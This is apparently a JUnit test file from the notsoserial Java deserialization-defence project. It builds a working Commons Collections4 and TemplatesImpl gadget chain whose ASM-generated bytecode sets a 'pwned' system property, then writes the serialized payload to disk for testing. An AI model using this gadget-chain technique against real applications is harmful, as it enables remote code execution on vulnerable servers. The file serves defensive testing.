/*
 * Copyright 2015 Kantega AS
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.kantega.notsoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.junit.Test;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;
import java.util.Queue;

/**
 *
 */
public class CreateBytesTest {

    @Test
    public void shouldCreateBytes() throws IOException, ClassNotFoundException {

        Object nastyObject = nastySerializable();

        byte[] ser = serialize(nastyObject);

        Files.write(Paths.get("target").resolve("bytes.ser"), ser);
    }

    private Object nastySerializable() {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[]{}, new Object[]{});


        Queue priorityQueue = new PriorityQueue(2, new TransformingComparator(transformer));
        priorityQueue.add(1);
        priorityQueue.add(1);


        TemplatesImpl templates = createTemplates();


        setFieldValue(transformer, "iMethodName", "newTransformer");

        Object[] queue = (Object[]) getFieldValue(priorityQueue, "queue");
        queue[0] = templates;
        queue[1] = templates;
        return priorityQueue;
    }

    private byte[] serialize(Object object) throws IOException {
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bout);
        out.writeObject(object);
        return bout.toByteArray();
    }

    private Object getFieldValue(Object object, String fieldName) {
        try {
            Field declaredField = object.getClass().getDeclaredField(fieldName);
            declaredField.setAccessible(true);
            return declaredField.get(object);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    private TemplatesImpl createTemplates() {

        TemplatesImpl templates = new TemplatesImpl();


        setFieldValue(templates, "_bytecodes", new byte[][]{createTransletBytes()});
        setFieldValue(templates, "_name", "TName");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;

    }

    private void setFieldValue(Object templates, String fieldname, Object value) {
        try {
            Field field = templates.getClass().getDeclaredField(fieldname);
            field.setAccessible(true);
            field.set(templates, value);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    private byte[] createTransletBytes() {

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_5,
                Opcodes.ACC_PUBLIC,
                "com/example/InvokingTranslet",
                null,
                Type.getType(AbstractTranslet.class).getInternalName(),
                new String[]{Type.getType(Serializable.class).getInternalName()});


        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, Type.getType(AbstractTranslet.class).getInternalName(), "<init>", "()V");
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitIntInsn(Opcodes.BIPUSH, 101);
        init.visitFieldInsn(Opcodes.PUTFIELD, Type.getType(AbstractTranslet.class).getInternalName(), "transletVersion", "I");
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(2, 2);
        init.visitEnd();


        MethodVisitor transformMethod = cw.visitMethod(Opcodes.ACC_PUBLIC,
                "transform",
                Type.getMethodDescriptor(Type.VOID_TYPE, new Type[]{Type.getType(DOM.class), Type.getType(DTMAxisIterator.class)}),
                null,
                new String[]{Type.getType(TransletException.class).getInternalName()});

        transformMethod.visitCode();
        transformMethod.visitInsn(Opcodes.RETURN);
        transformMethod.visitEnd();


        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        mv.visitCode();
        mv.visitFieldInsn(Opcodes.GETSTATIC, "java/lang/System", "out", "Ljava/io/PrintStream;");
        mv.visitLdcInsn("HMM..");
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/PrintStream", "println", "(Ljava/lang/String;)V");
        mv.visitLdcInsn("pwned");
        mv.visitLdcInsn("true");
        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/System", "setProperty", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;");
        mv.visitInsn(Opcodes.POP);
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(2, 0);
        mv.visitEnd();
        cw.visitEnd();

        return cw.toByteArray();
    }
}
